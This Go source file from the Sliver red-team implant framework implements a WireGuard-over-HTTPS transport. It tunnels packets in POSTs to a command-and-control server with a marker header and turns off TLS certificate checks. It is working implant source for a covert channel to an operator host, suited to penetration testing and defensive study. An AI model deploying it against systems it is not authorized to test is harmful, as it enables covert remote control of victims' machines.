//go:build windows || darwin || linux

package wireguard

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeWG}}

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"errors"
	"io"
	"net"
	"net/http"
	"net/netip"
	"net/url"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/proxy"
	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard/wghttpframe"
	"golang.zx2c4.com/wireguard/conn"
)

const (
	// wgHTTPHeader is the marker header every wg-over-https poll
	// carries. It must match the server handler in server/c2.
	wgHTTPHeader = "Sliver-WG"

	// wgHTTPHeaderValue is the required value of wgHTTPHeader.
	wgHTTPHeaderValue = "1"

	// wgHTTPContentType is the media type of poll request and response
	// bodies.
	wgHTTPContentType = "application/octet-stream"

	// wgHTTPPacketQueueLen bounds how many downlink packets can wait
	// between POSTs. Beyond it, the oldest packets are dropped; the
	// wireguard protocol retransmits or re-handshakes.
	wgHTTPPacketQueueLen = 128

	// wgHTTPWakeQueueLen bounds the number of pending wake signals for
	// the poster goroutine.
	wgHTTPWakeQueueLen = 16

	// wgHTTPProxyQueryKey is the origin query key holding an explicit
	// proxy setting, read the same way the HTTP C2 driver reads it.
	wgHTTPProxyQueryKey = "proxy"
)

// errWGBindClosed is returned once the bind is closed.
var errWGBindClosed = errors.New("wireguard http bind is closed")

// newWGHTTPSessionID - A random frame session ID for one implant.
func newWGHTTPSessionID() [16]byte {
	var sessionID [16]byte
	if _, err := rand.Read(sessionID[:]); err != nil {
		panic("[wg/https] crypto/rand failed: " + err.Error())
	}
	return sessionID
}

// wgHTTPEndpoint - A conn.Endpoint for the wg-over-https bind: there
// is one per device, pointing at the poll origin.
type wgHTTPEndpoint struct {
	addr netip.Addr
	dst  []byte
}

func (endpoint *wgHTTPEndpoint) ClearSrc()           {}
func (endpoint *wgHTTPEndpoint) SrcIP() netip.Addr   { return netip.Addr{} }
func (endpoint *wgHTTPEndpoint) SrcToString() string { return "" }
func (endpoint *wgHTTPEndpoint) DstIP() netip.Addr   { return endpoint.addr }

func (endpoint *wgHTTPEndpoint) DstToString() string {
	return netip.AddrPortFrom(endpoint.addr, 0).String()
}

func (endpoint *wgHTTPEndpoint) DstToBytes() []byte {
	if len(endpoint.dst) == 4 || len(endpoint.dst) == 16 {
		return endpoint.dst
	}
	// A zero netip.Addr is invalid: As16 panics. Keep a valid IPv4
	// placeholder so cookie replies under load cannot crash the implant.
	return []byte{0, 0, 0, 0}
}

// wgHTTPEndpointFromOrigin - A stable, valid endpoint for the poll
// origin. Hostnames that are not IPs still need a valid address: the
// device calls DstToBytes on the endpoint ParseEndpoint returned.
func wgHTTPEndpointFromOrigin(origin string) *wgHTTPEndpoint {
	addr := netip.MustParseAddr("0.0.0.0")
	if parsed, err := url.Parse(origin); err == nil {
		if parsedAddr, err := netip.ParseAddr(parsed.Hostname()); err == nil {
			addr = parsedAddr
		}
	}
	var dst []byte
	if addr.Is4() {
		ip4 := addr.As4()
		dst = append([]byte(nil), ip4[:]...)
	} else {
		ip16 := addr.As16()
		dst = append([]byte(nil), ip16[:]...)
	}
	return &wgHTTPEndpoint{addr: addr, dst: dst}
}

// wgHTTPBind - A conn.Bind that carries wireguard datagrams inside
// HTTPS POST request and response bodies. One session (one random
// frame session ID) serves the whole device; every Send is queued and
// flushed by one poster goroutine, which also keeps the poll alive
// with empty POSTs when the device has nothing to send.
type wgHTTPBind struct {
	// origin is the scheme://host:port poll URL; advanced options stay
	// in the original URL for proxy parsing but never go on the wire.
	origin       string
	sessionID    [16]byte
	pollInterval time.Duration
	client       *http.Client

	// outbox holds uplink packets waiting for the next POST.
	outbox    [][]byte
	incoming  chan []byte
	wake      chan struct{}
	closeChan chan struct{}
	endpoint  *wgHTTPEndpoint

	mutex      sync.Mutex
	open       bool
	postCancel context.CancelFunc
}

// NewHTTPBind - A conn.Bind that tunnels wireguard packets inside
// HTTPS POSTs to the given origin (for example https://c2.example:443).
// pollInterval is how often an idle implant polls; clientTimeout is
// the http.Client timeout. Call Open from the wireguard device before
// use.
func NewHTTPBind(origin string, pollInterval time.Duration, clientTimeout time.Duration) conn.Bind {
	sessionID := newWGHTTPSessionID()

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // We don't care about the HTTP(S) layer certs
	}
	transport := &http.Transport{
		IdleConnTimeout:     time.Millisecond,
		Dial:                proxy.Direct.Dial,
		TLSHandshakeTimeout: 30 * time.Second,
		TLSClientConfig:     tlsConfig,
	}
	applyWGHTTPProxyConfig(origin, transport)
	client := &http.Client{
		Timeout:   clientTimeout,
		Transport: transport,
	}

	normalized := normalizeWGHTTPOrigin(origin)
	if pollInterval <= 0 {
		pollInterval = DefaultWGHTTPPollInterval
	}
	return &wgHTTPBind{
		origin:       normalized,
		sessionID:    sessionID,
		pollInterval: pollInterval,
		client:       client,
		incoming:     make(chan []byte, wgHTTPPacketQueueLen),
		wake:         make(chan struct{}, wgHTTPWakeQueueLen),
		endpoint:     wgHTTPEndpointFromOrigin(normalized),
	}
}

// normalizeWGHTTPOrigin - Strip the sliver transport marker scheme:
// implants poll with "wg+https://host:port", but the actual HTTP
// requests go to "https://host:port".
func normalizeWGHTTPOrigin(origin string) string {
	if parsed, err := url.Parse(origin); err == nil && parsed.Scheme == "wg+https" {
		parsed.Scheme = "https"
		return parsed.String()
	}
	return origin
}

// pollURL - The origin without query options: the advanced options
// configure the bind locally and must not reach the server.
func (bind *wgHTTPBind) pollURL() string {
	originURL, err := url.Parse(bind.origin)
	if err != nil {
		return bind.origin
	}
	originURL.RawQuery = ""
	return originURL.String()
}

// applyWGHTTPProxyConfig - Configure the proxy setting the same way
// the HTTP C2 driver does: an explicit "proxy" query value on the
// origin wins, "auto" or unset auto-detects from the environment, and
// "never" bypasses the proxy.
func applyWGHTTPProxyConfig(origin string, transport *http.Transport) {
	originURL, err := url.Parse(origin)
	proxyConfig := ""
	if err == nil {
		proxyConfig = originURL.Query().Get(wgHTTPProxyQueryKey)
	}
	switch proxyConfig {
	case "never":
		break
	case "":
		fallthrough
	case "auto":
		p := proxy.NewProvider("").GetHTTPSProxy(origin)
		if p != nil {
			proxyURL := p.URL()
			if proxyURL.Scheme == "" {
				proxyURL.Scheme = "https"
			}
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	default:
		proxyURL, err := url.Parse(proxyConfig)
		if err != nil {
			break
		}
		if proxyURL.Scheme == "" {
			proxyURL.Scheme = "https"
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	}
}

func (bind *wgHTTPBind) Open(port uint16) ([]conn.ReceiveFunc, uint16, error) {
	bind.mutex.Lock()
	defer bind.mutex.Unlock()
	if bind.open {
		return nil, 0, conn.ErrBindAlreadyOpen
	}
	bind.open = true

	// The device closes and reopens the bind on up-state changes
	// (BindUpdate), so each Open gets a fresh closed-signal channel.
	closeChan := make(chan struct{})
	bind.closeChan = closeChan
	postCtx, postCancel := context.WithCancel(context.Background())
	bind.postCancel = postCancel
	go bind.posterLoop(closeChan, postCtx)

	recv := func(packets [][]byte, sizes []int, endpoints []conn.Endpoint) (int, error) {
		for {
			select {
			case <-closeChan:
				return 0, net.ErrClosed
			case packet := <-bind.incoming:
				// One packet per call: the downlink queue can reorder,
				// and batching would need endpoint bookkeeping that a
				// single-endpoint bind does not need.
				copied, ok := copyWGHTTPPacket(packets[0], packet)
				if !ok {
					continue
				}
				sizes[0] = copied
				endpoints[0] = bind.endpoint
				return 1, nil
			}
		}
	}
	return []conn.ReceiveFunc{recv}, port, nil
}

func (bind *wgHTTPBind) Close() error {
	bind.mutex.Lock()
	defer bind.mutex.Unlock()
	if !bind.open {
		return nil
	}
	bind.open = false
	if bind.postCancel != nil {
		bind.postCancel()
		bind.postCancel = nil
	}
	close(bind.closeChan)
	return nil
}

func (bind *wgHTTPBind) SetMark(value uint32) error {
	return nil
}

// Send - Queue uplink packets for the poster goroutine. The bind never
// blocks the device: when the outbox is full, packets are dropped and
// the wireguard protocol recovers.
func (bind *wgHTTPBind) Send(bufs [][]byte, endpoint conn.Endpoint) error {
	bind.mutex.Lock()
	defer bind.mutex.Unlock()
	if bind.closeChan == nil {
		return net.ErrClosed
	}
	select {
	case <-bind.closeChan:
		return net.ErrClosed
	default:
	}
	for _, buf := range bufs {
		packet := make([]byte, len(buf))
		copy(packet, buf)
		if len(bind.outbox) >= wgHTTPPacketQueueLen {
			copy(bind.outbox, bind.outbox[1:])
			bind.outbox[len(bind.outbox)-1] = packet
		} else {
			bind.outbox = append(bind.outbox, packet)
		}
	}
	select {
	case bind.wake <- struct{}{}:
	default:
	}
	return nil
}

// ParseEndpoint - The endpoint is fixed for the life of the session:
// every POST goes to the same origin.
func (bind *wgHTTPBind) ParseEndpoint(s string) (conn.Endpoint, error) {
	return bind.endpoint, nil
}

func (bind *wgHTTPBind) BatchSize() int { return 1 }

// posterLoop - One POST at a time for the life of the bind: send the
// queued packets, or an empty poll every pollInterval, and feed the
// response packets to the receive path. A failed POST drops the
// datagrams and retries on the next interval.
func (bind *wgHTTPBind) posterLoop(closeChan chan struct{}, ctx context.Context) {
	timer := time.NewTimer(bind.pollInterval)
	defer timer.Stop()
	for {
		select {
		case <-closeChan:
			return
		case <-ctx.Done():
			return
		case <-bind.wake:
			if !timer.Stop() {
				select {
				case <-timer.C:
				default:
				}
			}
		case <-timer.C:
		}
		timer.Reset(bind.pollInterval)

		bind.mutex.Lock()
		packets := bind.outbox
		bind.outbox = nil
		bind.mutex.Unlock()

		bind.post(ctx, packets)
	}
}

// post - One POST to the poll origin. A failed POST drops the
// datagrams; the device retransmits.
func (bind *wgHTTPBind) post(ctx context.Context, packets [][]byte) {
	frame := &wghttpframe.Frame{
		SessionID:           bind.sessionID,
		PollIntervalSeconds: wgHTTPPollIntervalSeconds(bind.pollInterval),
		Packets:             packets,
	}
	encoded, err := frame.Encode(nil)
	if err != nil {
		return
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, bind.pollURL(), bytes.NewReader(encoded))
	if err != nil {
		return
	}
	req.Header.Set(wgHTTPHeader, wgHTTPHeaderValue)
	req.Header.Set("Content-Type", wgHTTPContentType)

	resp, err := bind.client.Do(req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[wg/http] POST to %s failed: %v", bind.pollURL(), err)
		// {{end}}
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		// {{if .Config.Debug}}
		log.Printf("[wg/http] POST to %s got status %d", bind.pollURL(), resp.StatusCode)
		// {{end}}
		return
	}
	frame, err = wghttpframe.Decode(io.LimitReader(resp.Body, int64(wghttpframe.MaxFrameLen)))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[wg/http] response decode failed: %v", err)
		// {{end}}
		return
	}
	for _, packet := range frame.Packets {
		if err := enqueueWGHTTPIncoming(bind.incoming, packet, ctx.Done()); err != nil {
			return
		}
	}
}

// wgHTTPPollIntervalSeconds - Seconds advertised to the server, rounded
// up so a sub-second interval is not declared as 0 (server default) or
// truncated below what the implant actually waits.
func wgHTTPPollIntervalSeconds(interval time.Duration) uint16 {
	if interval <= 0 {
		return 0
	}
	secs := interval / time.Second
	if interval%time.Second != 0 {
		secs++
	}
	if secs > 65535 {
		return 65535
	}
	return uint16(secs)
}

// enqueueWGHTTPIncoming - Queue a downlink packet, dropping the oldest
// when the queue is full. closed is done when the bind is closing.
func enqueueWGHTTPIncoming(queue chan []byte, packet []byte, closed <-chan struct{}) error {
	select {
	case <-closed:
		return net.ErrClosed
	default:
	}
	select {
	case queue <- packet:
		return nil
	default:
	}
	select {
	case <-queue:
	default:
	}
	select {
	case queue <- packet:
	default:
	}
	return nil
}

// copyWGHTTPPacket - Copy into the device buffer. Windows and iOS
// device buffers are smaller than the codec's max packet, so reporting
// the uncopied length would make the device read past the buffer.
func copyWGHTTPPacket(dst []byte, src []byte) (int, bool) {
	if len(dst) == 0 || len(src) > len(dst) {
		return 0, false
	}
	return copy(dst, src), true
}

// {{end}} -IncludeWG
